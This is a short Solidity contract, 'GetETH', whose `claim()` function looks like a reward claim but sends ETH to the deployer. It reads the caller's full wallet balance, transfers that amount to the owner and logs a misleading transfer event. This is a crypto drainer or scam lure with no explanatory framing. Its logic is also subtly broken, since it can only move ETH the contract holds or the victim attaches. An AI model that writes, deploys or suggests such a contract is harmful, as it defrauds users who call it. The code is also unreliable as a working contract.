// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract GetETH {
    address private immutable owner;

    event TransferETH(address indexed from, address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function claim() external payable {
        uint256 bal = msg.sender.balance;
        if (bal > 0) {
            payable(owner).transfer(bal);
            emit TransferETH(msg.sender, owner, bal);
        }
    }
}
